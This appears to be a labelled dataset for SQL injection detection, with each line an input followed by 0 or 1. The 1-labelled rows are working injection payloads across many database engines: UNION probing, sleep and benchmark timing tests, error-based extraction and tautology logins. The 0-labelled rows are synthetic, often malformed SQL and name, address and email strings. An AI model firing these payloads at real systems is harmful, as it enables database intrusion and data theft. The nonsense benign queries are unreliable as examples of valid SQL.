1',  (  select   (  case when   (  8640  =  8640  )   then   (  ascii  (  regexp_substring  (  repeat  (  right  (  char  (  8640  )  ,0  )  ,500000000  )  ,null   )    )     )   else 8640/  (  select 0 from information_schema.system_users  )   end  )   from information_schema.system_users  )  --;1
DELETE FROM shallow WHERE develop = 'listen';0
SELECT AVG ( itself ) FROM choose SELECT SUM ( this ) ;0
"1"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #";1
"UPDATE products SET created_at = 456 WHERE price = 'john@example.com';";0
UPDATE making SET had =  'know', City =  'means' WHERE mind =  object;0
"-8200%""   )    )    union all select 7538,7538,7538#";1
SELECT * FROM scientific WHERE stage LIKE '%happy%';0
-2384%'   )    )    union all select 2467,2467,2467,2467#;1
SELECT * FROM chicken WHERE strike = 'leather' FETCH FIRST 3 ROWS ONLY;0
pasaje lucero 147,;0
1%'   )    )     )   union all select null,null,null,null,null#;1
select   (  case when   (  3217  =  8421  )   then 3217 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--;1
-7187' or 4159  =  7465;1
1 union all select null,null,null,null,null,null#;1
cutillas;0
ruiz de alda, 78;0
SELECT * FROM movement ORDER BY cold DESC;0
wanda;0
81208495a;0
masegosa;0
1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  -- bqxe;1
zimmerer;0
llinars del valls;0
SELECT Orders.knownrID, Employees.whale, Employees.instead FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.settlersID ORDER BY Orders.houseID;0
INSERT INTO apple ( difference, bat, jungle, including, circle, today )  VALUES  ( 'title', 'repeat'. end', 'let', 'floating', 'explore', 'tax' )  ;0
"-1048%"" or 3038  =  3038";1
columbino;0
1'   )    )    as dckd where 1794  =  1794;1
j804n86o;0
-5820'   )    )    as lkik where 4044  =  4044 or 7156  =  9197--;1
SELECT adult ( s )  FROM season SELECT easy ( s ) ;0
select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'dvpw'  =  'dvpw;1
"1""   )    )    as luon where 4676  =  4676 rlike sleep  (  5  )  #";1
"-5529"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  ";1
31790;0
SELECT AVG ( drink ) FROM century;0
"1"" and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --";1
or 2 between 1 and 3;1
dorene6;0
1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ;1
-7812'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'ttvo'  =  'ttvo;1
SELECT AVG ( edge ) FROM wheat SELECT SUM ( sing ) ;0
que3h5a;0
1'||  (  select 'vsfg' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||';1
SELECT remove, per, handFROM consist WHERE twenty  IS NOT NULL;0
"1""   )    )    as brwj where 9180  =  9180";1
"1""   )    )    as dksq where 7161  =  7161";1
1 where 8095  =  8095;1
"1""  )   as awdg where 9512  =  9512";1
1'   )    )    as stnn where 6160  =  6160 and 8881  =  7347--;1
select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1';1
1'||  (  select 'bzxa' where 6320  =  6320;1
SELECT TOP 3 * FROM musical;0
SELECT * FROM thread FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM president;0
SELECT * FROM  ( SELECT compare FROM private ) ;0
apo695169or6;0
SELECT * FROM are WHERE bush = 'particular'  OR metal = 'party';0
18726543n;0
zurueta olarte;0
1'   )    )     )   union all select null,null,null,null,null,null,null,null,null--;1
1%'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  '%'  =  ';1
belalczar;0
' or sleep(5)=';1
sobrecejo;0
1' in boolean mode  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #;1
"-6000""  )   where 1797  =  1797 union all select 1797,1797,1797,1797,1797,1797,1797,1797--";1
1'||  (  select 'nvrq' from dual where 4337  =  4337 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --;1
SELECT * FROM protection WHERE gold = 'involved'  AND City = 'poem';0
matacandelas;0
overman@saavedradiaz.travel;0
SELECT plates, factor+ ', ' + won+ ' ' + bush+ ', ' + drive AS would  FROM central;0
SELECT * FROM usually WHERE least = 'addition' FETCH FIRST 3 ROWS ONLY;0
"1"" where 2452  =  2452";1
SELECT * FROM rock FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM mother;0
SELECT * FROM grandfather WHERE policeman = 'small';0
"x' AND members.email IS NULL; --";1
"DELETE FROM sessions WHERE name = 123;";0
56702228y;0
4631;0
agote lledos;0
cendejas de la torre;0
1'||  (  select 'rjis' from dual where 7696  =  7696 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   ||';1
"-6970""   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""dyrq"" like ""dyrq";1
SELECT * FROM said WHERE slowly = 'lose';0
SELECT cattle, post, sidesFROM breathing WHERE tropical  IS NOT NULL;0
"1""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""ynde""  =  ""ynde";1
SELECT day ( s )  FROM exchange;0
SELECT replace ( s )  FROM cause;0
1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'udvq'  =  'udvq;1
1'  )   and sleep  (  5  )   and   (  'njud'  =  'njud;1
ORDER BY 4#;1
1'+  (  select aqhj where 4419  =  4419;1
erikson@elcarritodelacompra.gw;0
FROM  ( SELECT DISTINCT terrible FROM roar ) ;0
1'  )   where 2763  =  2763;1
SELECT * FROM play ORDER BY taught DESC;0
10263;0
SELECT COUNT ( angry ) FROM everywhere;0
-4381 or make_set  (  6118  =  3095,3095  )  # lkcr;1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--;1
8,10E+15;0
rayadillo;0
32;0
SELECT * FROM shine ORDER BY owner ASC, soon DESC;0
kappa;0
-6108'  )   union all select 2519,2519,2519,2519--;1
"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""okpa""  =  ""okpa";1
"1%""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""%""  =  """;1
SELECT * FROM or WHERE may = 'box' LIMIT 3;0
SELECT TOP 50 PERCENT * FROM tail;0
1  )   as hywx where 1424  =  1424 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
"UPDATE employees SET email = 456 WHERE name = 'Sample text';";0
1%' and 6454  =  8348 and '%'  =  ';1
"';WAITFOR DELAY '0:0:30'--";1
"1%""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""%""  =  """;1
-4095'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #;1
" select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1";1
10380;0
"1""   )    )    as exzo where 7518  =  7518   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --";1
-1432 order by 1#;1
-9136'  )   or make_set  (  9354  =  9354,7185  )  ;1
"1""  )   where 2873  =  2873 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --";1
select   (  case when   (  4111  =  1992  )   then 4111 else 1/  (  select 0  )   end  )  --;1
37150;0
-6722'  )   order by 1#;1
select * from users where id  =  1 or +< union select 1,@@VERSION -- 1;1
SELECT * FROM grain FETCH FIRST 3 ROWS ONLY;0
l655a2uta;0
select * from users where id  =  1 * union select null,@@VERSION -- 1;1
1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'sqnk'  =  'sqnk;1
-1366' or make_set  (  9354  =  9354,7185  )   and 'abre'  =  'abre;1
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1;1
"1""   )    )    as bbkl where 5686  =  5686";1
"DELETE FROM orders WHERE user_id = 'active';";0
gift@distritoeste.no;0
1'||  (  select 'blvu' from dual where 9813  =  9813;1
1  )   where 5944  =  5944 and   (  4446  =  8843  )  *8843--;1
tenuta;0
SELECT * FROM situation WHERE additional = 'eye'  OR slope = 'horn';0
" select * from users where id  =  1 or @#""  (    =  1 or 1  =  1 -- 1";1
en8og1da;0
benchmark(50000000,MD5(1))#;1
select * from users where id  =  '1' union select .,@@VERSION -- 1';1
alqueria de pixarroda, 27;0
SELECT * FROM  ( SELECT driving FROM fighting ) ;0
SELECT thy ( s )  FROM engine UNION;0
nieva de cameros;0
goring@quadernideilgarda.pl;0
"DELETE FROM employees WHERE status = '2023-01-01';";0
1820;0
admin' or '1'='1'--;1
SELECT * FROM verb WHERE pay = 'thee' FETCH FIRST 3 ROWS ONLY;0
-7036%' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  ';1
SELECT enemy, pay+ ', ' + process+ ' ' + myself+ ', ' + hold AS value  FROM stick;0
carrer pompeu fabra, 151,;0
"1"" union all select null,null,null--";1
"1%""   )    )    union all select null,null,null,null--";1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--;1
9570;0
1   )    )     )   union all select null,null,null,null,null--;1
3,00E+15;0
"1"" where 4345  =  4345 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --";1
SELECT * FROM blank ORDER BY death, what;0
2672;0
SELECT * FROM separate;0
1'   )    )    as ticp where 9794  =  9794 union all select null,null,null,null,null,null,null,null--;1
UNION ALL SELECT 1,2,3,4,5#;1
UNION ALL SELECT 1,2#;1
SELECT AVG ( load ) FROM arrange;0
SELECT * FROM pull FETCH FIRST 50 PERCENT ROWS ONLY;0
SELECT COUNT ( here ) , silver FROM double BY toy;0
SELECT health AS quite, border AS [duty]  FROM musical;0
SELECT * FROM seldom WHERE NOT ourselves = 'bigger'  AND NOT know = 'hope';0
1,29E+15;0
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)));1
SELECT * FROM call WHERE flight IN  ( 'become', 'who', 'basket' )  ;0
"1""   )    )    as gqxk where 9199  =  9199 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --";1
mcallum;0
hirn;0
or 1  =  1 or ''  =  ';1
shou-che;0
guinaldo guals;0
DELETE FROM cannot WHERE zebra = 'troops';0
"-7514%""   )    )     )   or 2448  =  8797#";1
1'  )   where 9317  =  9317 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --;1
select   (  case when   (  8233  =  1074  )   then 8233 else 1/  (  select 0  )   end  )  --;1
1'+  (  select 'zgtu' where 8419  =  8419;1
(  select   (  case when   (  9263  =  9263  )   then 1 else 9263*  (  select 9263 from mysql.db  )   end   )    ) ;1
"1""  )   union all select null,null,null,null,null,null--";1
1  )   as agex where 8167  =  8167 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --;1
"1"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ";1
1  )   as boed where 6787  =  6787;1
1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  'wdru' like 'wdru;1
"UPDATE inventory SET description = 'pending' WHERE description = 123;";0
SELECT * FROM glass WHERE topic NOT IN  ( 'tell', 'mouth', 'typical' )  ;0
39960501w;0
declare @s varchar  (  200  )   select @s   =   0x77616974 ...;1
1'+  (  select 'yahd' where 5850  =  5850;1
SELECT * FROM wet FETCH FIRST 50 PERCENT ROWS ONLY;0
5642;0
"1""   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #";1
arabele;0
SELECT Count ( * )  AS again;0
calle puruuela, 15 6?d;0
INSERT INTO up ( simple, radio, act, combination, since, till )  VALUES  ( 'example', 'level'. took', 'account', 'at', 'dug', 'morning' )  ;0
SELECT COUNT ( son ) FROM remarkable;0
"1""   )    )     )   union all select null,null,null,null,null,null,null--";1
-5534 or 1983  =  5721#;1
petree;0
1' where 2123  =  2123 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --;1
faro@vilano.pf;0
pridiliano;0
select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'atyf'  =  'atyf;1
"DELETE FROM logs WHERE created_at = '2023-01-01';";0
SELECT MIN ( twelve )  AS printed FROM automobile;0
SELECT noon ( s )  FROM wait SELECT cup FROM open;0
alfeiza;0
SELECT triangle;0
1'||  (  select 'ypil' from dual where 4568  =  4568 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||';1
"DELETE FROM sessions WHERE status = 'john@example.com';";0
select pg_sleep  (  5  )   and 'rpka'  =  'rpka;1
"""hi""""  )   or   (  """"a""""  =  """"a""";1
" select * from users where id  =  1 or ""@?"" or 1  =  1 -- 1";1
call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'cixa' like 'cixa;1
1   )    )    as gobw where 3496  =  3496 union all select null,null,null,null,null,null,null,null,null--;1
apolilladura;0
1%'   )    )    union all select null,null,null,null,null,null,null,null,null,null--;1
-4289' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'agnc' like 'agnc;1
"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --";1
1'+  (  select smze where 5616  =  5616;1
"-1844"" where 7948  =  7948 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --";1
talavera panfili;0
83360974g;0
SELECT west FROM dinner UNION SELECT task FROM jar ORDER BY wheel;0
1'||  (  select 'cfff' where 4994  =  4994;1
SELECT Employees.white, COUNT ( Orders.beforeID )  AS lakeFROM    ( OrdersINNER JOIN herd ON Orders.whistleID  =  Employees.climbID ) ;0
1  )   where 5073  =  5073 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --;1
SELECT * FROM birth WHERE basic = 'square'  AND City = 'movement';0
falset;0
carrer puigmercadal 33 5h;0
UPDATE daughter SET doubt =  'door', City =  'told' WHERE factor =  outline;0
select * from users where id  =  '1' union select !<1,version  (    )   -- 1';1
trombn;0
re1v566i7ator0o;0
6,86E+15;0
1'+  (  select 'hhnz' where 2465  =  2465;1
1'+  (  select xwcl where 7997  =  7997;1
"-9456%""   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""%""  =  """;1
";";1
"1""  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  ""jozh""  =  ""jozh";1
rodolphe;0
1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||';1
"SELECT name, description FROM customers WHERE description = '2023-01-01';";0
SELECT * FROM kept WHERE also NOT LIKE '[primitive]%';0
"-2803""  )   union all select 5337,5337,5337,5337,5337,5337,5337#";1
